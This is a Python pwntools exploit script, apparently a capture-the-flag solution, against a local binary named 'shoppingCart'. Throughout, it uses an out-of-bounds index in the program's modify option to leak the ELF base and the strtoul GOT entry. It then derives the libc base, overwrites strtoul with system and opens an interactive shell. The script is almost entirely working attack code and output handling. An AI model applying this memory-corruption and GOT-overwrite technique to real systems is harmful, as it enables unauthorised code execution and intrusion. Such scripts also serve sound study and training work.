from pwn import *

p = process('./shoppingCart')
context.log_level = 'debug'
libc = ELF('libc.so')

def store_money() :
    p.recvuntil('EMMmmm, you will be a rich man!\n')
    p.sendline('1')
    sleep(0.3)
    p.send('AAAAAAA')

def quit_store_money() :
    sleep(0.3)
    p.sendline('3')

def create(size,name) :
    sleep(0.3)
    p.sendline('1')
    sleep(0.3)
    p.sendline(str(size))
    sleep(0.3)
    p.send(name)

def delete(index) :
    p.recvuntil('Now, buy buy buy!\n')
    p.sendline('2')
    p.recvuntil('Which goods that you don\'t need?\n')
    p.sendline(str(index))

store_money()
quit_store_money()

p.recvuntil('Now, buy buy buy!\n')
p.sendline('3')
p.recvuntil('Which goods you need to modify?\n')
index = (0x010000000000202068 - 0x2021e0)/8
p.sendline(str(index))
p.recvuntil('you like to modify ')
data = u64(p.recv(6).ljust(8,'\x00'))
base_elf = data - 0x202068
log.success('elf base_addr:'+hex(base_elf))
payload = p64(base_elf+0x202068)
p.send(payload)

p.recvuntil('Now, buy buy buy!\n')
p.sendline('3')
p.recvuntil('Which goods you need to modify?\n')
index = (0x010000000000202140 - 0x2021e0)/8
p.sendline(str(index))
p.recvuntil(' to?\n')
p.send(p64(base_elf+0x202140))

p.recvuntil('Now, buy buy buy!\n')
p.sendline('3')
p.recvuntil('Which goods you need to modify?\n')
index = (0x0100000000002020A0 - 0x2021e0)/8
p.sendline(str(index))
p.recvuntil(' to?\n')
p.send(p64(base_elf+0x202058))

p.recvuntil('Now, buy buy buy!\n')
p.sendline('3')
p.recvuntil('Which goods you need to modify?\n')
index = (0x010000000000202140 - 0x2021e0)/8
p.sendline(str(index))
p.recvuntil('you like to modify ')
data2 = u64(p.recv(6).ljust(8,'\x00'))
log.success('strtoul_got_addr:'+hex(data2))
libc_base = data2 - libc.symbols['strtoul']
system_addr = libc_base + libc.symbols['system']
p.send(p64(system_addr))

p.interactive()
